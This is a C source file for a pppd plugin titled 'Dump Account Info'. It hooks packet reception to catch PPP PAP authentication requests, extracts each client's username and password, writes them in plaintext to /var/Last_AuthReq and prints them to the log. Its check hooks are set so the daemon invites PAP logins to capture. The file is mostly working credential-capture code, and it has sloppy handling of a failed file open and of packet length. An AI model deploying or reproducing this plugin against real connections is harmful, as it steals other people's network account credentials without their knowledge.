#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <netinet/in.h>
#include "pppd/pppd.h"
typedef unsigned char byte;
typedef unsigned short uint16_t;
//TODO : change the version here
char pppd_version[] = PPPOE_VER;

//static char saveuser[MAXNAMELEN] = {0};
//static char savepwd[MAXSECRETLEN] = {0};

void print_hex __P(( unsigned char *, uint8_t,  printer_func, void *));
void print_hex_to_file __P(( unsigned char *, uint8_t,  printer_func, FILE *));

void print_hex (p, len, printer, arg)
    unsigned char *p;
    uint8_t len;
    printer_func printer;
    void *arg;
{
	uint8_t c;
	printer(arg, "0x%02x ", len);
    for (; len > 0; --len) {
		c = *p++;
		printer(arg, "0x%02x ", (unsigned char) c);
    }
}
void print_hex_to_file (p, len, printer, arg)
    unsigned char *p;
	uint8_t len;
    printer_func printer;
    FILE *arg;
{
	uint8_t c;
	printer(arg, "%c", len);
    for (; len > 0; --len) {
		c = *p++;
		printer(arg, "%c", c);
    }
}

static int check()
{
    return 1;
}

static int auth(char *user, char *passwd,char **msgp,struct wordlist **paddrs,struct wordlist **popts)
{
    return 0;
}

static void snoop_recv(unsigned char *p, int len)
{
	unsigned char p_[len];
	memcpy(p_, p, len);
	//syslog(LOG_INFO,"%d",len);
	//info("%x",p);
	unsigned short *len_d = (unsigned short *)&p_[6];
	uint8_t len_user;
	uint8_t len_passwd;
	if(p_[2]==0xc0 && p_[3]==0x23){
		if(p_[4]==1){ //p[4]==UPAP_AUTHREQ
			init_pr_log("PPP Account:", LOG_INFO);
			pr_log(NULL,"\n");
			//print_string(p,len,pr_log,NULL);
			//print_string(p_,len,pr_log,NULL);
			//info("%d",htons(*len_d));
			if(htons(*len_d)==len-4){
				len_user=p_[8];
				len_passwd=p_[8+len_user+1];
				//pr_log(NULL,"%d\n",len_user);
				//pr_log(NULL,"%d\n",len_passwd);
				
				FILE *dF = fopen ("/var/Last_AuthReq", "w");
				if(dF){
					print_hex_to_file(&p_[8+1],len_user,fprintf,dF);
					//fprintf(dF,"\n");
					print_hex_to_file(&p_[8+len_user+2],len_passwd,fprintf,dF);
					//fwrite(&p_[8+1],sizeof(s1),1,fd);
					//write(&p_[8+1],sizeof(s1),1,fd);
					fflush(dF);
				}
				fclose(dF);
				dF=NULL;
				
				print_hex(&p_[8+1],len_user,pr_log,NULL);
				pr_log(NULL,"\n");
				print_hex(&p_[8+len_user+2],len_passwd,pr_log,NULL);
				pr_log(NULL,"\n");
				pr_log(NULL,"Account Dump Sucess");
			}
			end_pr_log();
		}
	}
}

void plugin_init(void)
{
    info("Dump Account Info");
	
    pap_check_hook=check;
    chap_check_hook=check;
    pap_auth_hook=auth;
    snoop_recv_hook=snoop_recv;
}
